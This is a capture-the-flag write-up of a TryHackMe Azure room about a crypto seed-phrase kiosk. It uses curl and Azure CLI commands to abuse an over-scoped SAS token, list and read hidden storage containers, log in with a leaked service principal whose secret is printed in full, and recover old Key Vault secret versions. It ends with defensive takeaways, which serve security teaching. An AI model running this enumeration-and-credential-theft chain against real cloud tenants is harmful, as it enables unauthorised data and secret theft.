---
title: "TryHackMe - Byte Lotus: CryptoCabana"
date: 2026-08-05
tags: ["TryHackMe", "Azure", "Cloud Security", "SAS Token", "Key Vault", "Cloud Misconfiguration"]
excerpt: "A seed-phrase backup kiosk ships an over-scoped Azure SAS token in its client-side JS, which leads to a hidden storage container, a leaked service principal, and a Key Vault with one secret rotated just out of reach."
---

# TryHackMe: Byte Lotus — CryptoCabana

**Room theme:** CryptoCabana, a beach-side kiosk that "backs up" a guest's crypto wallet seed phrase to "your own private vault." A guest's wallet gets drained by a transaction he never signed — the room's job is to work out what the kiosk trusts, and how far that trust actually reaches.

**Target:** an Azure Static Website — `https://cryptocabanaf5scjagc.z13.web.core.windows.net/` — no VM to exploit this time, purely an Azure cloud misconfiguration chain, worked with the Azure CLI.

**Task itinerary:**
- Pull apart what the kiosk hands out for free before you've even clicked anything.
- Follow that trust somewhere the kiosk's own page never once points you.
- Find a second, more valuable set of keys, and a vault that won't give up the real values on the first ask.

## The landing page

A single form: paste a recovery phrase, click "Back it up." The promise, verbatim: "Backed up. Sleep easy."

## Reading the client-side JS

Since a static site has to embed *something* to write to storage without a backend, the obvious first move is reading `app.js`:

```
curl -s https://cryptocabanaf5scjagc.z13.web.core.windows.net/app.js
```

```js
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=...";
```

The phrase gets `PUT` straight to `https://cryptocabanaf5scjagc.blob.core.windows.net/backups/<blob>?<SAS>` from the browser — no backend involved at all, which is already a red flag for a "vault." But the more interesting problem is in the SAS token's own scope.

## Reading the SAS token properly

Breaking down the query string:

- `ss=b` — applies to the Blob service.
- `srt=sco` — **S**ervice, **C**ontainer, and **O**bject resource types. Not scoped to a single container.
- `sp=rl` — **R**ead and **L**ist permissions.
- `se=2099-12-31...` — expires in the year 2099.

A SAS meant only to let a browser drop a file into `backups/` should have been scoped to that one container with only write/create permission. Instead it's a **service-level** token that can list every container in the account and read every blob in every one of them — a classic case of a token being scoped far more broadly than the feature that uses it actually needs.

## Enumerating the whole storage account

Service-level list, using the same SAS:

```
curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/?comp=list&<SAS>"
```

Three containers came back: `$web` (the static site itself), `backups` (the one the app links to), and — never referenced anywhere on the page — **`vault`**.

## What was in the hidden container

```
curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/vault?restype=container&comp=list&<SAS>"
```

Two blobs: `seed_phrase.txt` (a decoy — someone else's stolen recovery phrase, a nice thematic touch but not the objective) and `backup-service-account.json`. The second one was the real prize:

```
curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/vault/backup-service-account.json?<SAS>"
```

```json
{
  "client_id": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
  "client_secret": "UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg",
  "tenant_id": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",
  "key_vault_name": "ccabana-kv-f5scjagc",
  "key_vault_uri": "https://ccabana-kv-f5scjagc.vault.azure.net/",
  "note": "CryptoCabana backup automation account. Rotate this if it ever leaves the vault. -- IT"
}
```

A full Azure service principal — client ID, secret, and tenant — sitting in a blob container that a browser-facing SAS token could list and read. The "rotate this if it ever leaves the vault" note is the room's dry acknowledgment of exactly what we'd just done.

## Into the Key Vault

```
az login --service-principal -u <client_id> -p '<client_secret>' --tenant <tenant_id>
az keyvault secret list --vault-name ccabana-kv-f5scjagc
```

Four secrets: `key-shard-1`, `key-shard-2`, `key-shard-3`, and `master-key` — the setup for a split-flag puzzle.

## The vault that wouldn't give it up on the first ask

Fetching all four immediately hit two snags:

- `master-key` returned a hard `403 Forbidden` — the room's RBAC explicitly denies `getSecret` on that specific secret for this service principal (a `DenyAssignmentId`/scoped-RBAC pattern), regardless of the fact that `list` succeeded. Listing and reading are separate, independently-gated permissions in Key Vault.
- `key-shard-2`'s current value wasn't a flag fragment at all — it was a note: *"Rotated this after IT flagged it — old value should still be recoverable if you know where to look."*

Key Vault keeps prior versions of a secret unless they're explicitly purged. Listing versions surfaced exactly that:

```
az keyvault secret list-versions --vault-name ccabana-kv-f5scjagc --name key-shard-2
```

Two versions, seconds apart. Fetching the older one by its specific version ID recovered the real value:

```
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-2 \
  --version <older-version-id> --query value -o tsv
```

## Assembling the flag

```
key-shard-1        → THM{xx
key-shard-2 (old)  → _xx_
key-shard-3        → xx}
```

```
THM{xxx}
```

A nod to the classic crypto self-custody mantra — "not your keys, not your coins" — nicely on-theme for a room about a wallet-backup kiosk trusting the wrong thing.

## Takeaways

- Azure SAS tokens should always be scoped as tightly as the feature needs: a browser feature that only ever writes one blob to one container has no business holding a service-level, read+list, decades-long-lived SAS. `srt`/`sp`/`se` are the three fields to scrutinize on sight in any SAS query string.
- Any secret embedded in client-side JavaScript is public by definition — SAS tokens, API keys, and connection strings shipped to the browser should be treated as already leaked.
- Storage account enumeration via a SAS with service-level list rights doesn't stop at the container the app tells you about — always try listing the whole account, not just the referenced container.
- Key Vault access is governed by fine-grained, per-action RBAC (`list` and `get` are separate permissions, and can even be denied per-secret) — successfully listing secret names is not the same as being authorized to read their values.
- Secret rotation without purging old versions doesn't actually revoke access to the old value if the caller can still enumerate and fetch prior versions — rotation should be paired with explicit version cleanup (or, better, immediate credential invalidation at the source) if the goal is to actually cut off a leaked secret.